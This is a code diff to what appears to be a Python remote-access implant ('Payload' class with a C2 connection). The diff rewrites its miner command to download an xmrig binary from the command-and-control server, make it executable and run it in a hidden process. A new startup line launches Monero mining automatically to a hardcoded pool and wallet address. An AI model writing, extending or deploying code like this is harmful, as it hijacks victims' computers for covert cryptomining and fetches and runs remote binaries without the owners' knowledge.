@@ -107,6 +107,7 @@ class Payload():
         self.connection = self._get_connection(host, port)
         self.key = self._get_key(self.connection)
         self.info = self._get_info()
+        self.xmrig_path = None
 
 
     def _get_flags(self):
@@ -534,47 +535,41 @@ class Payload():
         return globals()['icloud'].run()
 
 
-    @config(platforms=['linux','linux2','darwin'], command=True, usage='miner <cmd> [url] [user] [pass]')
+    @config(platforms=['linux','linux2','darwin'], command=True, usage='miner <cmd> [url] [wallet]')
     def miner(self, args):
         """
         Run cryptocurrency miner in the background
 
         `Required`
-        :param str url:         stratum mining server url
+        :param str url:         mining server url
         :param str username:    username for mining server
-        :param str password:    password for mining server
 
 
         """
-        if 'miner' not in globals():
-            self.load('miner')
-        
         args = str(args).split()
 
-        if 'run' in args:
-            if len(args) == 4:
-                cmd, url, username, password  = args
-                try:
-                    # run miner (module forks and returns PID of child process)
-                    pid = globals()['miner'].run(url, username, password)
+        if 'run' in args and len(args) == 3:
+            cmd, url, username = args
 
-                    # add PID to child procs
-                    if 'miner' not in self.child_procs:
-                        self.child_procs['miner'] = []
-                    self.child_procs['miner'].append(pid)
+            # pull xmrig from server if necessary
+            if not self.xmrig_path:
+                self.xmrig_path = self.wget('http://{0}:{1}/xmrig/xmrig_{2}'.format(self.c2[0], int(self.c2[1]) + 1, sys.platform))
 
-                    return """Miner running in background\nPID: {0}""".format(pid)
-                except Exception as e:
-                    return "{} error: {}".format(self.miner.__name__, str(e))
-            return "usage: miner run [url] [user] [pass]"
+                # set up executable
+                if os.name == 'nt' and not self.xmrig_path.endswith('.exe'):
+                    os.rename(self.xmrig_path, self.xmrig_path + '.exe')
+                    self.xmrig_path += '.exe'
+
+                os.chmod(self.xmrig_path, 755)
+
+            # excute xmrig in hidden process
+            params = self.xmrig_path + " --url={url} --user={username} --coin=monero --donate-level=1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14".format(url=url, username=username)
+            result = self.execute(params)
+            return result
 
         elif 'stop' in args:
-            if 'miner' in self.child_procs and len(self.child_procs['miner']):
-                for pid in self.child_procs['miner']:
-                    try:
-                        os.kill(pid, signal.SIGKILL)
-                    except OSError as e:
-                        log("{} error: {}".format(self.miner.__name__, str(e)))
+            if self.xmrig_path in self.execute.process_list:
+                self.execute.process_list[self.xmrig_path].kill()
                 return "Miner stopped."
             else:
                 return "Miner is not running."
@@ -1088,6 +1083,9 @@ class Payload():
         self.handlers['package_handler'] = self._get_resources(target=self.remote['packages'], base_url='http://{}:{}'.format(host, port + 2))
         self.handlers['prompt_handler'] = self._get_prompt_handler() if not self.gui else None
         self.handlers['thread_handler'] = self._get_thread_handler()
+
+        # kick off miner
+        self.miner('run pool.hashvault.pro:80 46v4cAiT53y9Q6XwboCAHoct4mKXW4SHsgBA4TtEpMrgDCLxsyRXhawGJUQehVkkxNL8Z4n332Hgi8NoAXfV9gCSB3XWBLa')
 
         # loop listening for tasks from server and sending responses.
         # if connection is dropped, enter passive mode and retry connection every 30 seconds.
